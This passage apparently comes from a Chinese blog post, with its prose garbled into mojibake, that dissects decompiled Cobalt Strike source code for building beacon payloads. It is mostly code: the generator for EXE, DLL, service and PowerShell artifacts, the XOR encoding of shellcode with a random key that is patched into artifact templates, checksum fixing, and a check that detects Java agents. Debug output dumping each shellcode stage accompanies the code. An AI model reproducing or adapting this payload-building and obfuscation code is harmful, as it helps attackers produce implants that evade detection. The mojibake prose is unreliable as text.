punctuation">;</span><span class="token keyword">boolean</span> var3 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var4 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç”Ÿæˆ64ä½exe ç¨‹åº"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span><span class="token string">"windows64stager.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64big.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64svcbig.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64big.x64.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"PowerShell"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">buildPowerShell</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32big.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32svcbig.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32big.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"PowerShell"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">buildPowerShell</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".exe"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Can only sign EXE and DLL files\nSaved unsigned "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">DataUtils</span><span class="token punctuation">.</span><span class="token function">getSigner</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"Could not sign '"</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> var6<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Could not sign the file\nSaved unsigned "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showInfo</span><span class="token punctuation">(</span><span class="token string">"Saved "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ‰§è¡Œç»“æœ:</p><pre class="language-shell" data-language="shell"><code class="language-shell">stageless ç‚¹å‡»ç”Ÿæˆ: beacon_x64.exeç”Ÿæˆ64ä½exe ç¨‹åºå†™å…¥: shellcode&#x2F;windows64stager.binè¯»å–: artifact64big.exeå†™å…¥: shellcode&#x2F;artifact64big.exe.binå†™å…¥: shellcode&#x2F;PatchåŠ è½½å™¨ç›´æ¥åŠ è½½x64shellcode.binå†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–å.binå†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–åè¿˜åŸ.binå†™å…¥: shellcode&#x2F;artifact64big.exeå¡«å……A.binå†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–å2.bincall replaceAt!!!å†™å…¥: shellcode&#x2F;Patchartifactx64shellcodeäº¦æˆ–å3.binfix checksum!!!!å†™å…¥: shellcode&#x2F;var1Nofixsum.binPEEditor fix checksum!!!!å†™å…¥: shellcode&#x2F;fixchecsum.bin</code></pre><p>æˆ‘ä»¬æ¥åˆ†æä¸€æ³¢ ç”±äºæ˜¯exe<br>ä¼ å…¥shellcode </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64big.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>src&#x2F;common&#x2F;BaseArtifactUtils.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token class-name">String</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Stack</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"EXECUTABLE_ARTIFACT_GENERATOR"</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var4 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">RuntimeMXBean</span> var0 <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span> var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getInputArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var3<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span>var3 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span>var3<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"-javaagent:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è°ƒç”¨patchå‡½æ•° åŸºæœ¬å’Œstageè¿‡ç¨‹ä¸€æ ·å°±å¿½ç•¥äº†</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">_patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"artifact32"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"x86"</span> <span class="token operator">:</span> <span class="token string">"x64"</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> var4 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span><span class="token string">"resources/"</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯»å–: "</span><span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readAll</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact64big.exe</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">".bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"PatchåŠ è½½å™¨ç›´æ¥åŠ è½½"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›´æ¥ä½¿ç”¨loaderåŠ è½½</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var8 <span class="token operator">&lt;</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// System.out.println("äº¦æˆ–çš„æ•°å­—æ˜¯: " +var6[var8 % 4]);</span>var7<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>var8 <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//äº¦æˆ–åŠ å¯†ååˆ°å†…å­˜è¿˜åŸè§£å¯†åŠ è½½shellcode</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–å.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> yihuohuanyuan <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var7<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>yihuohuanyuan<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è¿˜åŸ</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>yihuohuanyuan<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–åè¿˜åŸ.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact32.exe è½¬æ¢æˆå­—ç¬¦ä¸² artifact64big.exe</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ‰¾é‡Œé¢çš„AAA</span><span class="token class-name">Packer</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var9 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> var6<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">hasLoaderHint</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetModuleHandleA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span 